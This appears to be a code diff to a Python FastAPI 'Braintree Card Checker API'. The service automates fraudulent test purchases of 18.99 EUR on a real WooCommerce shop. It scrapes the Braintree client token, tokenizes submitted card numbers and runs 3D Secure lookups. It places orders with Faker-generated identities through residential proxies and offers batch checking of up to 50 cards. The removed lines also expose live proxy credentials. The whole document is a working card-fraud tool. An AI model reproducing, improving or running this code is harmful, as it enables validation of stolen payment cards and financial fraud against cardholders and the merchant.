@@ -6,15 +6,17 @@ import datetime
 import json
 import re
 import uuid
-import curl_cffi.requests
+import httpx
 from bs4 import BeautifulSoup, Tag
 from fake_useragent import FakeUserAgent
 from faker import Faker
 from typing import Optional, List
+import os
 
 app = FastAPI(title="Braintree Card Checker API", version="1.0.0")
 
-PROXY = 'resi.legionproxy.io:9595:vUdAfD9RPXV8j2dX-res-any:MtsnNTSFWKsZoxJ4'  # Configure your proxy here
+# Configuración de proxy desde variable de entorno
+PROXY = os.getenv("PROXY")  # Format: proxy:port:username:password
 
 class CardRequest(BaseModel):
     card: str
@@ -40,16 +42,16 @@ def parse_card(card: str):
         )
 
 async def get_ip_address() -> str:
-    async with curl_cffi.requests.AsyncSession(impersonate="chrome") as session:
+    async with httpx.AsyncClient(timeout=30.0) as client:
         try:
-            resp = await session.get(
+            resp = await client.get(
                 "https://api.ipify.org?format=json",
                 headers={
                     "accept": "application/json",
                     "user-agent": FakeUserAgent(os=["Windows"]).chrome,
                 },
             )
-            if resp.ok:
+            if resp.status_code == 200:
                 return resp.json().get("ip", "")
             else:
                 print(f"[ERROR] Failed to get IP address: {resp.status_code}")
@@ -90,34 +92,41 @@ async def braintree_18_99_eur(card: str):
     if not ip_address:
         return "error", "Could not retrieve IP address", None, None
 
-    session_kwargs = {"impersonate": "chrome"}
+    client_kwargs = {
+        "timeout": 60.0,
+        "headers": {
+            "user-agent": user_agent
+        }
+    }
     
     if PROXY:
-        proxy_parts = PROXY.split(":")
-        if len(proxy_parts) == 4:
-            proxy, port, username, password = proxy_parts
-            session_kwargs["proxies"] = {
-                "http": f"socks5h://{username}:{password}@{proxy}:{port}",
-                "https": f"socks5h://{username}:{password}@{proxy}:{port}",
-            }
+        try:
+            proxy_parts = PROXY.split(":")
+            if len(proxy_parts) == 4:
+                proxy, port, username, password = proxy_parts
+                proxy_url = f"socks5://{username}:{password}@{proxy}:{port}"
+                client_kwargs["proxies"] = {
+                    "http://": proxy_url,
+                    "https://": proxy_url,
+                }
+        except Exception as e:
+            print(f"[ERROR] Proxy configuration error: {e}")
 
-    async with curl_cffi.requests.AsyncSession(**session_kwargs) as session:
+    async with httpx.AsyncClient(**client_kwargs) as client:
         try:
             # REQ 1: POST to admin-ajax.php
             req_num = 1
-            resp = await session.post(
+            resp = await client.post(
                 "https://nammanmuay.eu/wp-admin/admin-ajax.php",
                 headers={
                     "accept": "*/*",
-                    "accept-encoding": "gzip, deflate, br, zstd",
+                    "accept-encoding": "gzip, deflate, br",
                     "accept-language": "en-US,en;q=0.9",
                     "cache-control": "no-cache",
                     "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "origin": "https://nammanmuay.eu",
                     "pragma": "no-cache",
-                    "priority": "u=1, i",
                     "referer": "https://nammanmuay.eu/namman-muay-cream-100g/",
-                    "user-agent": user_agent,
                     "x-requested-with": "XMLHttpRequest",
                 },
                 data={
@@ -128,27 +137,25 @@ async def braintree_18_99_eur(card: str):
                 },
             )
 
-            if not resp.ok:
+            if resp.status_code != 200:
                 return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None
 
             # REQ 2: GET to checkout
             req_num = 2
-            resp = await session.get(
+            resp = await client.get(
                 "https://nammanmuay.eu/checkout/",
                 headers={
                     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-                    "accept-encoding": "gzip, deflate, br, zstd",
+                    "accept-encoding": "gzip, deflate, br",
                     "accept-language": "en-US,en;q=0.9",
                     "cache-control": "no-cache",
                     "pragma": "no-cache",
-                    "priority": "u=0, i",
                     "referer": "https://nammanmuay.eu/namman-muay-cream-100g/",
                     "upgrade-insecure-requests": "1",
-                    "user-agent": user_agent,
                 },
             )
 
-            if not resp.ok:
+            if resp.status_code != 200:
                 return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None
 
             soup = BeautifulSoup(resp.text, "html.parser")
@@ -158,14 +165,17 @@ async def braintree_18_99_eur(card: str):
                 return "error", "Script with 'wc_braintree_client_token' not found", None, None
 
             script_content = script_tag.get_text()
-            match = re.search(r"wc_braintree_client_token\s*=\s*\"(.*?)\";", script_content, re.DOTALL)
+            match = re.search(r"wc_braintree_client_token\s*=\s*\"(.*?)\"", script_content, re.DOTALL)
             
             if not match:
                 return "error", "Variable 'wc_braintree_client_token' not found", None, None
 
             client_token = match.group(1).strip()
-            decoded_token = json.loads(base64.b64decode(client_token).decode("utf-8"))
-            authorization_fingerprint = decoded_token.get("authorizationFingerprint")
+            try:
+                decoded_token = json.loads(base64.b64decode(client_token).decode("utf-8"))
+                authorization_fingerprint = decoded_token.get("authorizationFingerprint")
+            except Exception as e:
+                return "error", f"Failed to decode client token: {str(e)}", None, None
 
             input_tag = soup.find("input", id="woocommerce-process-checkout-nonce")
             if input_tag and isinstance(input_tag, Tag):
@@ -175,11 +185,11 @@ async def braintree_18_99_eur(card: str):
 
             # REQ 3: POST to graphql to get cardinalAuthenticationJWT
             req_num = 3
-            resp = await session.post(
+            resp = await client.post(
                 "https://payments.braintree-api.com/graphql",
                 headers={
                     "accept": "*/*",
-                    "accept-encoding": "gzip, deflate, br, zstd",
+                    "accept-encoding": "gzip, deflate, br",
                     "accept-language": "en-US,en;q=0.9",
                     "authorization": f"Bearer {authorization_fingerprint}",
                     "braintree-version": "2018-05-10",
@@ -187,9 +197,7 @@ async def braintree_18_99_eur(card: str):
                     "content-type": "application/json",
                     "origin": "https://assets.braintreegateway.com",
                     "pragma": "no-cache",
-                    "priority": "u=1, i",
                     "referer": "https://assets.braintreegateway.com/",
-                    "user-agent": user_agent,
                 },
                 json={
                     "clientSdkMetadata": {
@@ -201,25 +209,28 @@ async def braintree_18_99_eur(card: str):
                 },
             )
 
-            if not resp.ok:
+            if resp.status_code != 200:
                 return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None
 
             resp_json = resp.json()
-            cardinal_jwt = (
-                resp_json.get("data", {})
-                .get("clientConfiguration", {})
-                .get("creditCard", {})
-                .get("threeDSecure", {})
-                .get("cardinalAuthenticationJWT")
-            )
+            try:
+                cardinal_jwt = (
+                    resp_json.get("data", {})
+                    .get("clientConfiguration", {})
+                    .get("creditCard", {})
+                    .get("threeDSecure", {})
+                    .get("cardinalAuthenticationJWT")
+                )
+            except Exception:
+                cardinal_jwt = None
 
             # REQ 4: POST to graphql to get tokenized credit card
             req_num = 4
-            resp = await session.post(
+            resp = await client.post(
                 "https://payments.braintree-api.com/graphql",
                 headers={
                     "accept": "*/*",
-                    "accept-encoding": "gzip, deflate, br, zstd",
+                    "accept-encoding": "gzip, deflate, br",
                     "accept-language": "en-US,en;q=0.9",
                     "authorization": f"Bearer {authorization_fingerprint}",
                     "braintree-version": "2018-05-10",
@@ -227,9 +238,7 @@ async def braintree_18_99_eur(card: str):
                     "content-type": "application/json",
                     "origin": "https://assets.braintreegateway.com",
                     "pragma": "no-cache",
-                    "priority": "u=1, i",
                     "referer": "https://assets.braintreegateway.com/",
-                    "user-agent": user_agent,
                 },
                 json={
                     "clientSdkMetadata": {
@@ -259,31 +268,31 @@ async def braintree_18_99_eur(card: str):
                 },
             )
 
-            if not resp.ok:
+            if resp.status_code != 200:
                 return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None
 
             resp_json = resp.json()
-            token = resp_json.get("data", {}).get("tokenizeCreditCard", {}).get("token")
+            try:
+                token = resp_json.get("data", {}).get("tokenizeCreditCard", {}).get("token")
+            except Exception:
+                token = None
 
             if not token:
                 return "error", "Failed to get token", None, None
 
             # REQ 5: POST to lookup
             req_num = 5
-            resp = await session.post(
+            resp = await client.post(
                 f"https://api.braintreegateway.com/merchants/vb72b9cm2v6gskzz/client_api/v1/payment_methods/{token}/three_d_secure/lookup",
                 headers={
                     "accept": "*/*",
-                    "accept-encoding": "gzip, deflate, br, zstd",
+                    "accept-encoding": "gzip, deflate, br",
                     "accept-language": "en-US,en;q=0.9",
                     "cache-control": "no-cache",
                     "content-type": "application/json",
-                    "dnt": "1",
                     "origin": "https://nammanmuay.eu",
                     "pragma": "no-cache",
-                    "priority": "u=1, i",
                     "referer": "https://nammanmuay.eu/",
-                    "user-agent": user_agent,
                 },
                 json={
                     "amount": "18.99",
@@ -339,38 +348,38 @@ async def braintree_18_99_eur(card: str):
                 },
             )
 
-            if not resp.ok:
+            if resp.status_code != 200:
                 return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None
 
             resp_json = resp.json()
-            nonce = resp_json.get("paymentMethod", {}).get("nonce")
-            status = (
-                resp_json.get("paymentMethod", {})
-                .get("threeDSecureInfo", {})
-                .get("status")
-            )
-            enrolled = (
-                resp_json.get("paymentMethod", {})
-                .get("threeDSecureInfo", {})
-                .get("enrolled")
-            )
+            try:
+                nonce = resp_json.get("paymentMethod", {}).get("nonce")
+                status = (
+                    resp_json.get("paymentMethod", {})
+                    .get("threeDSecureInfo", {})
+                    .get("status")
+                )
+                enrolled = (
+                    resp_json.get("paymentMethod", {})
+                    .get("threeDSecureInfo", {})
+                    .get("enrolled")
+                )
+            except Exception:
+                return "error", "Failed to parse 3D Secure info", None, None
 
             # REQ 6: POST to get cart id
             req_num = 6
-            resp = await session.post(
+            resp = await client.post(
                 "https://nammanmuay.eu/?wc-ajax=bwfan_insert_abandoned_cart&wfacp_id=54599&wfacp_is_checkout_override=yes",
                 headers={
                     "accept": "*/*",
-                    "accept-encoding": "gzip, deflate, br, zstd",
+                    "accept-encoding": "gzip, deflate, br",
                     "accept-language": "en-US,en;q=0.9",
                     "cache-control": "no-cache",
                     "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-                    "dnt": "1",
                     "origin": "https://nammanmuay.eu",
                     "pragma": "no-cache",
-                    "priority": "u=1, i",
                     "referer": "https://nammanmuay.eu/checkout/",
-                    "user-agent": user_agent,
                     "x-requested-with": "XMLHttpRequest",
                 },
                 data={
@@ -405,150 +414,105 @@ async def braintree_18_99_eur(card: str):
                 },
             )
 
-            if not resp.ok:
+            if resp.status_code != 200:
                 return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None
 
-            cart_id = resp.json().get("id")
+            try:
+                cart_id = resp.json().get("id")
+            except Exception:
+                cart_id = None
 
             # REQ 7: POST to checkout (final request)
             req_num = 7
-            checkout_data = [
-                ("_wfacp_post_id", "54599"),
-                ("wfacp_cart_hash", ""),
-                ("wfacp_has_active_multi_checkout", ""),
-                ("wfacp_source", "https://nammanmuay.eu/checkouts/checkout/"),
-                ("product_switcher_need_refresh", "1"),
-                ("wfacp_cart_contains_subscription", "0"),
-                (
-                    "wfacp_exchange_keys",
-                    '{"pre_built":{},"oxy":{"wfacp_form":"wfacp_oxy_checkout_form","order_summary":"wfacp_order_summary_widget"}}',
-                ),
-                ("wfacp_input_hidden_data", "{}"),
-                (
-                    "wfacp_input_phone_field",
-                    f'{{"billing":{{"code":"1","number":"{phone}","hidden":"no"}},"shipping":{{"code":"","number":"","hidden":""}}',
-                ),
-                ("wfacp_timezone", "America/New_York"),
-                ("wc_order_attribution_source_type", "typein"),
-                (
-                    "wc_order_attribution_referrer",
-                    "https://nammanmuay.eu/namman-muay-cream-100g/",
-                ),
-                ("wc_order_attribution_utm_campaign", "(none)"),
-                ("wc_order_attribution_utm_source", "(direct)"),
-                ("wc_order_attribution_utm_medium", "(none)"),
-                ("wc_order_attribution_utm_content", "(none)"),
-                ("wc_order_attribution_utm_id", "(none)"),
-                ("wc_order_attribution_utm_term", "(none)"),
-                ("wc_order_attribution_utm_source_platform", ""),
-                ("wc_order_attribution_utm_creative_format", ""),
-                ("wc_order_attribution_utm_marketing_tactic", ""),
-                (
-                    "wc_order_attribution_session_entry",
-                    "https://nammanmuay.eu/checkout/",
-                ),
-                ("wc_order_attribution_session_start_time", start_time),
-                ("wc_order_attribution_session_pages", "2"),
-                ("wc_order_attribution_session_count", "1"),
-                (
-                    "wc_order_attribution_user_agent",
-                    user_agent,
-                ),
-                ("wfacp_billing_address_present", "yes"),
-                ("wfob_input_hidden_data", "{}"),
-                ("wfob_input_bump_shown_ids", "54600"),
-                ("wfob_input_bump_global_data", ""),
-                ("billing_email", email),
-                ("bwfan_cart_id", cart_id),
-                ("billing_first_name", first_name),
-                ("billing_last_name", last_name),
-                ("billing_address_1", street_address),
-                ("billing_address_2", street_address),
-                ("billing_country", "US"),
-                ("billing_city", city),
-                ("billing_postcode", zip_code),
-                ("billing_phone", phone),
-                ("shipping_same_as_billing", "1"),
-                ("shipping_first_name", first_name_es),
-                ("shipping_last_name", last_name_es),
-                ("shipping_address_1", street_address_es),
-                ("shipping_address_2", street_address_es),
-                ("shipping_country", "ES"),
-                ("shipping_city", city_es),
-                ("shipping_postcode", zip_code_es),
-                ("wfacp_coupon_field", ""),
-                ("shipping_method[0]", "flat_rate:53"),
-                ("payment_method", "braintree_cc"),
-                ("braintree_cc_nonce_key", nonce),
-                (
-                    "braintree_cc_device_data",
-                    f'{{"correlation_id":{session_id}}}',
-                ),
-                ("braintree_cc_3ds_nonce_key", ""),
-                (
-                    "braintree_cc_config_data",
-                    f'{{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/vb72b9cm2v6gskzz/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{{"url":"https://client-analytics.braintreegateway.com/vb72b9cm2v6gskzz"}},"merchantId":"vb72b9cm2v6gskzz","venmo":"off","graphQL":{{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]}},"challenges":["cvv"],"creditCards":{{"supportedCardTypes":["Discover","Maestro","UK Maestro","MasterCard","Visa","American Express"]}},"threeDSecureEnabled":true,"threeDSecure":{{"cardinalAuthenticationJWT":"{cardinal_jwt}","cardinalSongbirdUrl":"https://songbird.cardinalcommerce.com/edge/v1/songbird.js","cardinalSongbirdIdentityHash":null}},"paypalEnabled":true,"paypal":{{"displayName":"Namman Muay","clientId":"AbRpNknbcK9FznJo2iQkRxSKrgXTdwyu1DiNyS7Pr8brByT5uCOVLQG1EKVFlP2JVDEX49yLnyWQaD1l","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"peterpupovacgmailcom","payeeEmail":null,"currencyIsoCode":"EUR"}}',
-                ),
-                ("terms", "on"),
-                ("terms-field", "1"),
-                ("bwfan_user_consent", "1"),
-                ("woocommerce-process-checkout-nonce", checkout_nonce),
-                (
-                    "_wp_http_referer",
-                    "/?wc-ajax=update_order_review&wfacp_id=54599&wfacp_is_checkout_override=yes",
-                ),
-                ("wc_order_attribution_source_type", "typein"),
-                (
-                    "wc_order_attribution_referrer",
-                    "https://nammanmuay.eu/namman-muay-cream-100g/",
-                ),
-                ("wc_order_attribution_utm_campaign", "(none)"),
-                ("wc_order_attribution_utm_source", "(direct)"),
-                ("wc_order_attribution_utm_medium", "(none)"),
-                ("wc_order_attribution_utm_content", "(none)"),
-                ("wc_order_attribution_utm_id", "(none)"),
-                ("wc_order_attribution_utm_term", "(none)"),
-                ("wc_order_attribution_utm_source_platform", ""),
-                ("wc_order_attribution_utm_creative_format", ""),
-                ("wc_order_attribution_utm_marketing_tactic", ""),
-                (
-                    "wc_order_attribution_session_entry",
-                    "https://nammanmuay.eu/checkout/",
-                ),
-                ("wc_order_attribution_session_start_time", start_time),
-                ("wc_order_attribution_session_pages", "2"),
-                ("wc_order_attribution_session_count", "1"),
-                (
-                    "wc_order_attribution_user_agent",
-                    user_agent,
-                ),
-                ("billing_state", ""),
-                ("shipping_state", ""),
-                ("ship_to_different_address", "1"),
-            ]
+            checkout_data = {
+                "_wfacp_post_id": "54599",
+                "wfacp_cart_hash": "",
+                "wfacp_has_active_multi_checkout": "",
+                "wfacp_source": "https://nammanmuay.eu/checkouts/checkout/",
+                "product_switcher_need_refresh": "1",
+                "wfacp_cart_contains_subscription": "0",
+                "wfacp_exchange_keys": '{"pre_built":{},"oxy":{"wfacp_form":"wfacp_oxy_checkout_form","order_summary":"wfacp_order_summary_widget"}}',
+                "wfacp_input_hidden_data": "{}",
+                "wfacp_input_phone_field": f'{{"billing":{{"code":"1","number":"{phone}","hidden":"no"}},"shipping":{{"code":"","number":"","hidden":""}}}}',
+                "wfacp_timezone": "America/New_York",
+                "wc_order_attribution_source_type": "typein",
+                "wc_order_attribution_referrer": "https://nammanmuay.eu/namman-muay-cream-100g/",
+                "wc_order_attribution_utm_campaign": "(none)",
+                "wc_order_attribution_utm_source": "(direct)",
+                "wc_order_attribution_utm_medium": "(none)",
+                "wc_order_attribution_utm_content": "(none)",
+                "wc_order_attribution_utm_id": "(none)",
+                "wc_order_attribution_utm_term": "(none)",
+                "wc_order_attribution_utm_source_platform": "",
+                "wc_order_attribution_utm_creative_format": "",
+                "wc_order_attribution_utm_marketing_tactic": "",
+                "wc_order_attribution_session_entry": "https://nammanmuay.eu/checkout/",
+                "wc_order_attribution_session_start_time": start_time,
+                "wc_order_attribution_session_pages": "2",
+                "wc_order_attribution_session_count": "1",
+                "wc_order_attribution_user_agent": user_agent,
+                "wfacp_billing_address_present": "yes",
+                "wfob_input_hidden_data": "{}",
+                "wfob_input_bump_shown_ids": "54600",
+                "wfob_input_bump_global_data": "",
+                "billing_email": email,
+                "bwfan_cart_id": cart_id or "",
+                "billing_first_name": first_name,
+                "billing_last_name": last_name,
+                "billing_address_1": street_address,
+                "billing_address_2": street_address,
+                "billing_country": "US",
+                "billing_city": city,
+                "billing_postcode": zip_code,
+                "billing_phone": phone,
+                "shipping_same_as_billing": "1",
+                "shipping_first_name": first_name_es,
+                "shipping_last_name": last_name_es,
+                "shipping_address_1": street_address_es,
+                "shipping_address_2": street_address_es,
+                "shipping_country": "ES",
+                "shipping_city": city_es,
+                "shipping_postcode": zip_code_es,
+                "wfacp_coupon_field": "",
+                "shipping_method[0]": "flat_rate:53",
+                "payment_method": "braintree_cc",
+                "braintree_cc_nonce_key": nonce or "",
+                "braintree_cc_device_data": f'{{"correlation_id":"{session_id}"}}',
+                "braintree_cc_3ds_nonce_key": "",
+                "braintree_cc_config_data": f'{{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/vb72b9cm2v6gskzz/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{{"url":"https://client-analytics.braintreegateway.com/vb72b9cm2v6gskzz"}},"merchantId":"vb72b9cm2v6gskzz","venmo":"off","graphQL":{{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]}},"challenges":["cvv"],"creditCards":{{"supportedCardTypes":["Discover","Maestro","UK Maestro","MasterCard","Visa","American Express"]}},"threeDSecureEnabled":true,"threeDSecure":{{"cardinalAuthenticationJWT":"{cardinal_jwt or ""}","cardinalSongbirdUrl":"https://songbird.cardinalcommerce.com/edge/v1/songbird.js","cardinalSongbirdIdentityHash":null}},"paypalEnabled":true,"paypal":{{"displayName":"Namman Muay","clientId":"AbRpNknbcK9FznJo2iQkRxSKrgXTdwyu1DiNyS7Pr8brByT5uCOVLQG1EKVFlP2JVDEX49yLnyWQaD1l","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"peterpupovacgmailcom","payeeEmail":null,"currencyIsoCode":"EUR"}}}}',
+                "terms": "on",
+                "terms-field": "1",
+                "bwfan_user_consent": "1",
+                "woocommerce-process-checkout-nonce": checkout_nonce,
+                "_wp_http_referer": "/?wc-ajax=update_order_review&wfacp_id=54599&wfacp_is_checkout_override=yes",
+                "billing_state": "",
+                "shipping_state": "",
+                "ship_to_different_address": "1",
+            }
 
-            resp = await session.post(
+            resp = await client.post(
                 "https://nammanmuay.eu/?wc-ajax=checkout&wfacp_id=54599&wfacp_is_checkout_override=yes",
                 headers={
                     "accept": "application/json, text/javascript, */*; q=0.01",
-                    "accept-encoding": "gzip, deflate, br, zstd",
+                    "accept-encoding": "gzip, deflate, br",
                     "accept-language": "en-US,en;q=0.9",
                     "cache-control": "no-cache",
                     "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "origin": "https://nammanmuay.eu",
                     "pragma": "no-cache",
-                    "priority": "u=1, i",
                     "referer": "https://nammanmuay.eu/checkout/",
-                    "user-agent": user_agent,
                     "x-requested-with": "XMLHttpRequest",
                 },
                 data=checkout_data,
             )
 
-            if not resp.ok:
+            if resp.status_code != 200:
                 return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None
 
-            resp_json = resp.json()
+            try:
+                resp_json = resp.json()
+            except Exception:
+                return "error", "Invalid JSON response from checkout", None, None
             
             if resp_json.get("result") == "success":
                 return "approved", "Charged 18,99€", status, enrolled
@@ -566,7 +530,17 @@ async def braintree_18_99_eur(card: str):
 
 @app.get("/")
 async def root():
-    return {"message": "Braintree Card Checker API", "version": "1.0.0"}
+    return {
+        "message": "Braintree Card Checker API", 
+        "version": "1.0.0",
+        "status": "online",
+        "endpoints": {
+            "check_single_card": "/check-card",
+            "check_multiple_cards": "/check-cards",
+            "health": "/health",
+            "docs": "/docs"
+        }
+    }
 
 @app.post("/check-card", response_model=CardResponse)
 async def check_card(request: CardRequest):
@@ -599,6 +573,9 @@ async def check_cards(request: CardBatchRequest):
     """
     Check multiple credit cards in batch
     """
+    if len(request.cards) > 50:  # Limit batch size
+        raise HTTPException(status_code=400, detail="Maximum 50 cards per batch")
+    
     results = []
     
     for card in request.cards:
@@ -646,8 +623,13 @@ async def health_check():
     """
     Health check endpoint
     """
-    return {"status": "healthy", "timestamp": datetime.datetime.now().isoformat()}
+    return {
+        "status": "healthy", 
+        "timestamp": datetime.datetime.now().isoformat(),
+        "service": "Braintree Card Checker API"
+    }
 
 if __name__ == "__main__":
     import uvicorn
-    uvicorn.run(app, host="0.0.0.0", port=8000)
+    port = int(os.getenv("PORT", 8000))
+    uvicorn.run(app, host="0.0.0.0", port=port)
